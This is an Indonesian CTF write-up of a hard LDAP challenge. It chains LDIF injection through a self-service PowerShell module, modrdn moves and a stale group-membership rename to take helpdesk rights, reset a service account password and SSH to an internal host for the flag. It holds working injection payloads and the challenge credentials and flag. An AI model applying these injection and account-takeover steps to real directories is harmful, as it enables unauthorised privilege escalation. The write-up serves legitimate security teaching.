# Writeup CTF: Self-service

- **Kategori:** Misc / LDAP Exploitation
- **Tingkat Kesulitan:** Hard
- **Target:** `self-service-8e6b68d81566.chall.nnsc.tf:1337`
- **Initial Account:** `ereid:Summer2026`
- **Flag:** `NNS{4_j0B_71tle_15_no7_4n_acCes5_coN7R0l_bouND4ry_4nd_4Pp4ren71Y_7H3R3_aRe_4ctUa1_oR65_tha7_Do_stUp1D_sH17_l1K3_tH1s}`

---

# 1. Deskripsi Tantangan

Challenge memberikan akses ke environment PowerShell dengan akun:

```
ereid
```

Tujuan akhirnya adalah mendapatkan akses ke server internal:

```
srv2
```

dan membaca flag.

Sistem menggunakan:

```
LDAP directory service
```

untuk mengelola:

- user;
- group;
- permission;
- attribute account.

Terdapat fitur self-service untuk mengubah attribute milik user sendiri.

---

# 2. Initial Access

Credential awal:

```
ereid:Summer2026
```

Target:

```
self-service-8e6b68d81566.chall.nnsc.tf:1337
```

Koneksi:

```bash
ssh \
-o ProxyCommand='openssl s_client -quiet -connect %h:%p' \
ereid@self-service-8e6b68d81566.chall.nnsc.tf \
-p 1337
```

---

Shell yang diberikan:

```
PowerShell 7.4.6
```

Cek user:

```powershell
id
```

Output:

```
uid=5011(ereid)
gid=5000(corp)
groups=5000(corp)
```

---

# 3. Enumerasi PowerShell Module

Saat login terdapat informasi:

```
Directory self-service loaded.
Get-Command -Module SelfService
```

Cek module:

```powershell
Get-Command -Module SelfService
```

Output:

```
Get-MyDirectoryEntry

Get-MyDn

Set-MyDirectoryAttribute
```

---

Inspect module:

```powershell
Get-Module -Name SelfService |
Format-List *
```

Source module tersedia.

---

# 4. Analisis Self-Service Module

Konfigurasi LDAP:

```powershell
$script:Base = 'dc=corp,dc=nns'

$script:Uri  = 'ldap://dir:3389'

$script:Cred = $null
```

---

## Get-MyDn

Fungsi:

```powershell
function Get-MyDn {

    param([string]$Uid = $env:USER)

    $out = & ldapsearch -x -LLL \
        -H $script:Uri \
        -b $script:Base \
        "(uid=$Uid)" dn

}
```

Fungsi ini mengambil DN user aktif.

---

## Set-MyDirectoryAttribute

Bagian penting:

```powershell
$ldif =
"dn: $dn
changetype: modify
replace: $Name
${Name}: $Value
"

$ldif |
ldapmodify \
-x \
-H $script:Uri \
-D $dn \
-w $pw
```

---

Masalah:

Input:

```
$Name

$Value
```

langsung dimasukkan ke LDIF.

Tidak ada:

- escaping;
- sanitization;
- validasi newline.

---

Ini menyebabkan:

```
LDAP/LDIF Injection
```

---

# 5. Enumerasi ACL User

Jalankan:

```powershell
Get-MyDirectoryEntry -RightsOnly
```

Masukkan password:

```
Summer2026
```

Output:

```
entryLevelRights: none
```

Tetapi terdapat attribute yang writable:

```
sn:rscwo

cn:rsc

title:rscwo

description:rscwo

loginShell:rscwo
```

---

Uji:

```powershell
Set-MyDirectoryAttribute \
-Name description \
-Value TEST-SELF
```

Cek:

```bash
ldapsearch ... description
```

Hasil:

```
description: TEST-SELF
```

Artinya:

```
self attribute modification
```

berjalan.

---

# 6. Menemukan Group Privilege

Cek membership:

```bash
ldapsearch ... memberOf
```

Account:

```
ereid
```

merupakan anggota:

```
cn=onboarding-agents,
ou=groups,
dc=corp,dc=nns
```

---

Inspect group:

```bash
ldapsearch \
-b 'cn=onboarding-agents,ou=groups,dc=corp,dc=nns'
```

Hasil:

```
description:
Contractor onboarding coordinators.
May move contractor accounts
into ou=staff when they convert
to permanent.
```

---

Temuan:

Group ini memiliki hak:

```
moddn
```

untuk memindahkan account:

```
ou=contractors

        |

        v

ou=staff
```

---

# 7. Enumerasi LDAP ACI

Cari ACL:

```bash
ldapsearch \
-b 'dc=corp,dc=nns' \
aci
```

---

## Self Service ACL

```
acl "Self service";

allow(write)
userdn = "ldap:///self";
```

---

## Contractor Conversion ACL

```
acl "Contractor to permanent conversion";

allow(moddn)

groupdn =
"ldap:///cn=onboarding-agents,
ou=groups,
dc=corp,dc=nns";
```

---

## Ops Password ACL

Target:

```
uid=ops,ou=staff,dc=corp,dc=nns
```

ACL:

```
acl "Helpdesk resets service account passwords";

allow(write)

userPassword

groupdn =
"ldap:///cn=helpdesk,
ou=groups,
dc=corp,dc=nns";
```

---

Artinya:

```
helpdesk

   |

   v

reset password ops

   |

   v

SSH srv2

   |

   v

flag
```

---

# 8. Exploit LDIF Injection

Karena input dimasukkan langsung ke LDIF:

Format normal:

```
dn: user

changetype: modify

replace: attribute

attribute: value
```

---

Kita dapat menyisipkan record kedua:

Contoh:

```powershell
Set-MyDirectoryAttribute `
-Name description `
-Value "
INJECT

dn: uid=ereid,ou=contractors,dc=corp,dc=nns

changetype: modify

replace: title

title: INJECT-TWO
"
```

---

Server menerima dua operasi.

Hasil:

```
description: INJECT

title: INJECT-TWO
```

---

Dengan ini:

```
arbitrary LDIF modification
```

dapat dilakukan.

---

# 9. Abuse moddn Contractor → Staff

Karena group:

```
onboarding-agents
```

memiliki:

```
moddn
```

kita inject:

```ldif
dn:
uid=ereid,ou=contractors,dc=corp,dc=nns

changetype: modrdn

newrdn:
uid=ereid

deleteoldrdn: 1

newsuperior:
ou=staff,dc=corp,dc=nns
```

---

Hasil:

Sebelum:

```
uid=ereid,ou=contractors
```

Sesudah:

```
uid=ereid,ou=staff
```

---

# 10. Menemukan Weak Group Membership

Group:

```
helpdesk
```

berisi:

```
cnovak

agrant

pdelgado
```

---

Contoh:

```
dn:
uid=cnovak,ou=staff,dc=corp,dc=nns

memberOf:
cn=helpdesk,
ou=groups,
dc=corp,dc=nns
```

---

Masalah:

LDAP tidak membersihkan referensi group ketika RDN berubah.

---

# 11. Exploit DN/RDN Confusion

Rename:

```
uid=cnovak
```

menjadi:

```
uid=vacant123
```

Dengan:

```ldif
dn:
uid=cnovak,ou=staff,dc=corp,dc=nns

changetype: modrdn

newrdn:
uid=vacant123

deleteoldrdn: 1
```

---

Setelah rename:

```
memberOf:
helpdesk
```

tetap melekat.

---

Sehingga:

```
cnovak

   |

   v

vacant123

   |

   v

masih helpdesk
```

---

# 12. Mengambil Identity Helpdesk

Account kita kemudian diubah menjadi:

```
uid=cnovak,ou=staff,dc=corp,dc=nns
```

Dengan password:

```
Summer2026
```

Sekarang identity tersebut memiliki privilege:

```
helpdesk
```

---

# 13. Reset Password ops

Gunakan privilege baru:

Target:

```
uid=ops,ou=staff,dc=corp,dc=nns
```

LDIF:

```ldif
dn:
uid=ops,ou=staff,dc=corp,dc=nns

changetype: modify

replace: userPassword

userPassword:
NNS-temp-2026!
```

---

Jalankan:

```bash
ldapmodify \
-x \
-H ldap://dir:3389 \
-D "uid=cnovak,ou=staff,dc=corp,dc=nns" \
-w Summer2026
```

Output:

```
modifying entry
uid=ops,ou=staff,dc=corp,dc=nns
```

Password berhasil diubah.

---

# 14. Pivot ke srv2

Dari environment:

```bash
cat /etc/hosts
```

Didapat:

```
172.20.127.225 srv2
```

---

SSH:

```bash
ssh ops@srv2
```

Password:

```
NNS-temp-2026!
```

---

Berhasil masuk:

```
ops@srv2:~$
```

---

# 15. Membaca Flag

Cari file:

```bash
ls
```

Output:

```
flag.txt
```

---

Baca:

```bash
cat flag.txt
```

---

# 16. Kesimpulan

Challenge ini memanfaatkan kombinasi beberapa kelemahan:

## 1. LDAP/LDIF Injection

Input user dimasukkan langsung ke LDIF:

```
Value
 |
 v
LDAP Operation
```

---

## 2. Self-Service ACL Terlalu Luas

User dapat memodifikasi attribute sendiri.

---

## 3. Weak Group Membership Handling

Rename LDAP account tidak membersihkan referensi group.

---

## 4. Privilege Escalation

Rantai exploit:

```
ereid

 |

 v

LDIF Injection

 |

 v

Contractor -> Staff

 |

 v

RDN confusion

 |

 v

Helpdesk privilege

 |

 v

Reset ops password

 |

 v

SSH srv2

 |

 v

Flag
```

---

# Flag

```
NNS{4_j0B_71tle_15_no7_4n_acCes5_coN7R0l_bouND4ry_4nd_4Pp4ren71Y_7H3R3_aRe_4ctUa1_oR65_tha7_Do_stUp1D_sH17_l1K3_tH1s}
```
